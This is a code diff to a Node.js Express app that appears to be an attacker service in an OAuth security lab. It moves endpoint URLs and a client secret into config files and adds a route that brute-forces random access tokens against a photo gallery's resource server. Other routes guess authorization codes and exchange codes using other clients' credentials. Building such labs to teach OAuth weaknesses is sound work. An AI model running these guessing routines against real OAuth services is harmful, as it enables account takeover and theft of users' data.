@@ -4,6 +4,9 @@ const cookieParser = require('cookie-parser');
 const bodyParser = require('body-parser');
 const path = require('path');
 const request = require('request');
+const gallery = require('./config/gallery.json');
+const photoprint = require('./config/photoprint.json');
+
 
 let app = express();
 
@@ -57,8 +60,8 @@ app.get('/guessauthzcode', async function(req, res){
       'headers':{
         'content-type': 'application/x-www-form-urlencoded'
       },
-      'url':'http://gallery:3005/oauth/token', 
-      'body':'code='+randomguess+'&redirect_uri=http%3A%2F%2Fphotoprint%3A3000%2Fcallback&grant_type=authorization_code&client_id=photoprint&client_secret=secret'
+      'url':gallery.oauth.auth.tokenHost + gallery.oauth.auth.tokenPath, 
+      'body':'code='+randomguess+'&redirect_uri=' + photoprint.oauth.client.redirect_uri + '&grant_type=authorization_code&client_id=' + photoprint.oauth.client.id + '&client_secret=' + photoprint.oauth.client.secret
     };
     try {
       response = await makeRequest(options);
@@ -74,18 +77,46 @@ app.get('/guessauthzcode', async function(req, res){
   res.render('authcodeguess', {codes: codes});
 });
 
-async function getPictureUrls(access_token) {
+app.get('/guessaccesstokenatresourceserver', async function(req, res){
+  searchSpace = 100000;
+  maxGuesses = 100;
+  tokens = [];
+  for(i = 0; i < maxGuesses; i++) {
+    randomguess = Math.floor(Math.random()*Math.floor(searchSpace));
+    
+    try {
+      response = await getPictureUrls2(randomguess);
+      var obj = JSON.parse(response);
+      if(obj.images != undefined){
+        tokens.push(randomguess);
+      }
+
+    }catch (error) {
+      console.error(error);
+    }
+  }
+  console.log(tokens);
+  res.render('tokenguess', {tokens: tokens});
+});
+
+async function getPictureUrls2(access_token) {
   if(access_token == undefined) {
     return [];
   }
   options2 = {
+    'proxy':'http://localhost:8080',
     'method':'get',
     'headers':{
       "Accept": "application/json"
     },
-    'url':'http://gallery:3005/photos/me?access_token=' + access_token
+    'url':gallery.oauth.auth.tokenHost + gallery.photos + '?access_token=' + access_token
+    //'url':'http://gallery:3005/photos/me?access_token=' + access_token
   };
-  response = await makeRequest(options2);
+  return await makeRequest(options2);
+}
+
+async function getPictureUrls(access_token) {
+  response = await getPictureUrls2(access_token);
   images = JSON.parse(response).images;
   return images;
 }
@@ -100,7 +131,7 @@ app.post('/exchangewithothercreds', async function(req, res){
     'headers':{
       'content-type': 'application/x-www-form-urlencoded'
     },
-    'url':'http://gallery:3005/oauth/token', 
+    'url':gallery.oauth.auth.tokenHost + gallery.oauth.auth.tokenPath, 
     'body':'code='+code+'&redirect_uri=http%3A%2F%2Fphotoprint%3A3000%2Fcallback&grant_type=authorization_code&client_id=' + clientid + '&client_secret=' + secret
   };
   try {
